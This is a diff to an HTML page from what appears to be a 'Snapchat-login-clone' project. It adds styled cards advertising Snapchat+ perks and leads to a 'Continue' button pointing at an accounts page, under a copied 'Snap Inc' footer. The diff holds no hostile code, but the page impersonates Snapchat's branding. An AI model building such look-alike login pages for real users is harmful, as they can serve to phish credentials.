@@ -10,6 +10,202 @@
   <link rel="stylesheet" href="css/index.css">
   <title>Snapchat</title>
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      background: #211f12;
+      color: #ffffff;
+    }
+
+    .benefits {
+      width: 100%;
+      padding: 12px 16px;
+    }
+
+    .benefits-grid {
+      display: grid;
+      grid-template-columns: repeat(2, minmax(0, 1fr));
+      gap: 10px 12px;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    .benefit-card {
+      min-width: 0;
+      min-height: 76px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 10px 12px;
+      border-radius: 13px;
+      background: #302e20;
+      transition: background 0.2s ease,
+        transform 0.2s ease;
+    }
+
+    .benefit-card:hover {
+      background: #393726;
+      transform: translateY(-2px);
+    }
+
+    .benefit-icon {
+      width: 46px;
+      height: 46px;
+      flex: 0 0 46px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 12px;
+      overflow: hidden;
+    }
+
+    .benefit-icon svg {
+      display: block;
+      width: 100%;
+      height: 100%;
+    }
+
+    .icon-snap {
+      background: linear-gradient(135deg,
+          #b5e6ed,
+          #fff3a6,
+          #f4b5d4,
+          #c7b7fa);
+      border: 2px solid #e8dfbb;
+    }
+
+    .icon-star,
+    .icon-friend,
+    .icon-custom,
+    .icon-stories {
+      border-radius: 50%;
+    }
+
+    .icon-star {
+      width: 36px;
+      height: 36px;
+      flex-basis: 36px;
+      margin: 5px;
+      background: #5b5d57;
+      border: 2px solid #e2c55d;
+    }
+
+    .icon-friend {
+      background: #ffca18;
+    }
+
+    .icon-custom,
+    .icon-stories {
+      background: #e1c44f;
+    }
+
+    .icon-sparkles {
+      color: #f5d45b;
+      font-size: 31px;
+      line-height: 1;
+      letter-spacing: -4px;
+    }
+
+    .benefit-content {
+      min-width: 0;
+    }
+
+    .benefit-title {
+      margin: 0 0 4px;
+      font-size: 16px;
+      font-weight: 600;
+      line-height: 1.15;
+      color: #ffffff;
+    }
+
+    .benefit-description {
+      margin: 0;
+      font-size: 12px;
+      font-weight: 400;
+      line-height: 1.35;
+      color: #f2f0e8;
+    }
+
+    /* Tablet */
+    @media (max-width: 600px) {
+      .benefits {
+        padding: 10px;
+      }
+
+      .benefits-grid {
+        gap: 8px;
+      }
+
+      .benefit-card {
+        padding: 10px;
+        gap: 8px;
+      }
+
+      .benefit-icon {
+        width: 38px;
+        height: 38px;
+        flex-basis: 38px;
+      }
+
+      .icon-star {
+        width: 32px;
+        height: 32px;
+        flex-basis: 32px;
+      }
+
+      .benefit-title {
+        font-size: 14px;
+      }
+
+      .benefit-description {
+        font-size: 11px;
+      }
+    }
+
+    /* Mobile */
+    @media (max-width: 420px) {
+      .benefits-grid {
+        grid-template-columns: 1fr;
+      }
+
+      .benefit-card {
+        min-height: 74px;
+        padding: 12px;
+        gap: 12px;
+      }
+
+      .benefit-icon {
+        width: 44px;
+        height: 44px;
+        flex-basis: 44px;
+      }
+
+      .icon-star {
+        width: 36px;
+        height: 36px;
+        flex-basis: 36px;
+      }
+
+      .benefit-title {
+        font-size: 15px;
+      }
+
+      .benefit-description {
+        font-size: 12px;
+      }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      .benefit-card {
+        transition: none;
+      }
+    }
+  </style>
 </head>
 
 <body>
@@ -20,10 +216,120 @@
       outline: none !important;
     }
   </style>
+
   <div>Get exclusive perks, experimental features, and priority support with Snapchat+ ⭐</div>
-  <div class="loader">
+  <section class="benefits" aria-label="Snapchat Plus benefits">
+    <div class="benefits-grid">
+
+      <!-- 1. App Icon -->
+      <article class="benefit-card">
+        <div class="benefit-icon icon-snap">
+          <svg viewBox="0 0 48 48" aria-hidden="true">
+            <path d="M24 6c-8 0-12 6-12 14v7c-2 2-5 3-7 4
+              1 3 5 4 8 4 1 4 4 6 7 6 2 0 3-2 4-2s2 2 4 2
+              c3 0 6-2 7-6 3 0 7-1 8-4-2-1-5-2-7-4v-7
+              C36 12 32 6 24 6Z" fill="#ffffff" stroke="#222222" stroke-width="2.3" stroke-linejoin="round" />
+          </svg>
+        </div>
+        <div class="benefit-content">
+          <h3 class="benefit-title">App Icon</h3>
+          <p class="benefit-description">
+            Pick your own custom app icon from our ever growing library
+          </p>
+        </div>
+      </article>
+
+      <!-- 2. Snapchat+ Badge -->
+      <article class="benefit-card">
+        <div class="benefit-icon icon-star">
+          <svg viewBox="0 0 48 48" aria-hidden="true">
+            <path d="M24 5 29.7 17l13 1.6-9.5 9 2.5 13L24 34.2
+              12.3 40.6l2.5-13-9.5-9L18.3 17 24 5Z" fill="#ffffff" stroke="#d8d8d8" stroke-width="1.5"
+              stroke-linejoin="round" />
+          </svg>
+        </div>
+        <div class="benefit-content">
+          <h3 class="benefit-title">Snapchat+ Badge</h3>
+          <p class="benefit-description">
+            Get a Snapchat+ badge that appears next to your name on your profile
+          </p>
+        </div>
+      </article>
+
+      <!-- 3. Best Friend -->
+      <article class="benefit-card">
+        <div class="benefit-icon icon-friend">
+          <svg viewBox="0 0 48 48" aria-hidden="true">
+            <circle cx="24" cy="24" r="22" fill="#ffca18" />
+            <circle cx="16" cy="19" r="3" fill="#60451a" />
+            <circle cx="32" cy="19" r="3" fill="#60451a" />
+            <path d="M13 28 Q24 42 35 28" fill="none" stroke="#60451a" stroke-width="3" stroke-linecap="round" />
+          </svg>
+        </div>
+        <div class="benefit-content">
+          <h3 class="benefit-title">#1 Best Friend</h3>
+          <p class="benefit-description">
+            Pin one friend as your #1 BFF Be the first to try the newest Snapchat features
+          </p>
+        </div>
+      </article>
+
+      <!-- 4. Customize App -->
+      <article class="benefit-card">
+        <div class="benefit-icon icon-custom">
+          <svg viewBox="0 0 48 48" aria-hidden="true">
+            <path d="M12 12c6-6 13 1 11 7l-5 5-6-1-4 4
+              -3-3 4-4-1-6 4-2Z" fill="#66501c" />
+            <path d="M27 22c5-5 13 1 10 7l-5 5-7-1-4 4-3-3
+              4-4-1-6 6-2Z" fill="#66501c" />
+            <circle cx="15" cy="15" r="2" fill="#e1c44f" />
+            <circle cx="31" cy="26" r="2" fill="#e1c44f" />
+          </svg>
+        </div>
+        <div class="benefit-content">
+          <h3 class="benefit-title">Customize your App</h3>
+          <p class="benefit-description">
+            Use Chat wallpapers, Bitmoji backgrounds, custom notification sounds and more
+          </p>
+        </div>
+      </article>
+
+      <!-- 5. Early Access -->
+      <article class="benefit-card">
+        <div class="benefit-icon icon-sparkles" aria-hidden="true">
+          ✨
+        </div>
+        <div class="benefit-content">
+          <h3 class="benefit-title">Get early access</h3>
+          <p class="benefit-description">
+            Be the first to try the newest Snapchat features before anyone else
+          </p>
+        </div>
+      </article>
+
+      <!-- 6. Enhance Stories -->
+      <article class="benefit-card">
+        <div class="benefit-icon icon-stories">
+          <svg viewBox="0 0 48 48" aria-hidden="true">
+            <path d="M24 6c-7 5-12 12-12 22l8-2 2 9
+              5-9 8 2C35 18 31 11 24 6Z" fill="#66501c" stroke="#66501c" stroke-width="1.5" stroke-linejoin="round" />
+            <circle cx="24" cy="19" r="4" fill="#e1c44f" />
+            <path d="m16 31-5 7 9-4M31 31l5 7-9-4" fill="#66501c" />
+          </svg>
+        </div>
+        <div class="benefit-content">
+          <h3 class="benefit-title">Enhance your stories</h3>
+          <p class="benefit-description">
+            See how often friends watch your Stories and Boost them to get more views
+          </p>
+        </div>
+      </article>
+
+    </div>
+  </section>
+  <!-- <div class="loader">
     <div class="logo"><img src="/Snapchat-login-clone/img/faviconV2.png" alt=""></div>
-  </div>
+  </div> -->
   <div><button class="login-button"><a href="Acconts.html">Continue</a></button></div>
   <div class="bottom-text">
     <div class="copyright">© Snap Inc 2026</div>
